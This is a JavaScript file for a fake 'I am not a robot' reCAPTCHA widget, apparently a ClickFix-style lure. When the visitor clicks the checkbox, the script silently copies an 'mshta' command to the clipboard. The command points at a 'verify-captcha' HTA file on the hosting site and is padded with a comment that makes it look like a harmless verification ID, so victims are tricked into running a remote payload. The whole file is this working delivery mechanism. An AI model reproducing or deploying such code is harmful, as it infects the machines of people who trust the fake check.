let checkboxWindow = document.getElementById("checkbox-window");
let checkboxBtn = document.getElementById("checkbox");
let checkboxBtnSpinner = document.getElementById("spinner");
let verifywindow = document.getElementById("verify-window");

function addCaptchaListeners() {
    if (checkboxBtn) {
        document.addEventListener("click", function (event) {
            let path = event.composedPath();
            if (!path.includes(verifywindow) && isverifywindowVisible()) {
                closeverifywindow();
            }
        });
        checkboxBtn.addEventListener("click", function (event) {
            event.preventDefault();
            checkboxBtn.disabled = true;
            runClickedCheckboxEffects();
        });
    }
}

function runClickedCheckboxEffects() {
    hideCaptchaCheckbox();
    setTimeout(function () {
        showCaptchaLoading();
    }, 500);
    setTimeout(function () {
        showVerifyWindow();
    }, 900)
}

function showCaptchaLoading() {
    checkboxBtnSpinner.style.visibility = "visible";
    checkboxBtnSpinner.style.opacity = "1";
    checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
}

function hideCaptchaLoading() {
    checkboxBtnSpinner.style.opacity = "0";
    checkboxBtnSpinner.style.animation = "none";
    setTimeout(function () {
        checkboxBtnSpinner.style.visibility = "hidden";
    }, 500);
}

function hideCaptchaCheckbox() {
    checkboxBtn.style.visibility = "hidden";
    checkboxBtn.style.opacity = "0";
}


function showCaptchaCheckbox() {
    checkboxBtn.style.width = "100%";
    checkboxBtn.style.height = "100%";
    checkboxBtn.style.borderRadius = "2px";
    checkboxBtn.style.margin = "21px 0 0 12px";
    checkboxBtn.style.opacity = "1";
}

function hideCaptchaCheckbox() {
    checkboxBtn.style.width = "4px";
    checkboxBtn.style.height = "4px";
    checkboxBtn.style.borderRadius = "50%";
    checkboxBtn.style.marginLeft = "25px";
    checkboxBtn.style.marginTop = "33px";
    checkboxBtn.style.opacity = "0";
}

function showCaptchaLoading() {
    checkboxBtnSpinner.style.visibility = "visible";
    checkboxBtnSpinner.style.opacity = "1";
}

function hideCaptchaLoading() {
    checkboxBtnSpinner.style.visibility = "hidden";
    checkboxBtnSpinner.style.opacity = "0";
}

function generateRandomNumber() {
    const min = 1000;
    const max = 9999;
    return Math.floor(Math.random() * (max - min + 1) + min).toString();
}

function closeverifywindow() {
    verifywindow.style.display = "none";
    verifywindow.style.visibility = "hidden";
    verifywindow.style.opacity = "0";

    showCaptchaCheckbox();
    hideCaptchaLoading();
    checkboxBtn.disabled = false;
}

function isverifywindowVisible() {
    return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
}

function setClipboardCopyData(textToCopy) {
    const tempTextArea = document.createElement("textarea");
    tempTextArea.value = textToCopy;
    document.body.append(tempTextArea);
    tempTextArea.select();
    document.execCommand("copy");
    document.body.removeChild(tempTextArea);
}

function stageClipboard(commandToRun, verification_id) {
    const suffix = " # "
    const ploy = "✅ ''I am not a robot - reCAPTCHA Verification ID: "
    const end = "''"
    const textToCopy = commandToRun + suffix + ploy + verification_id + end

    setClipboardCopyData(textToCopy);
}


function showVerifyWindow() {
    verifywindow.style.display = "block";
    verifywindow.style.visibility = "visible";
    verifywindow.style.opacity = "1";
    verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
    verifywindow.style.left = checkboxWindow.offsetLeft + 54 + "px";

    if (verifywindow.offsetTop < 5) {
        verifywindow.style.top = "5px";
    }

    if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth - 10) {
        verifywindow.style.left = checkboxWindow.offsetLeft - 8 + "px";
    }

    var verification_id = generateRandomNumber();
    document.getElementById('verification-id').textContent = verification_id;

    const htaPath = new URL("./verify-captcha", window.location.href).toString();
    const commandToRun = "mshta " + htaPath;
    stageClipboard(commandToRun, verification_id);
}

addCaptchaListeners();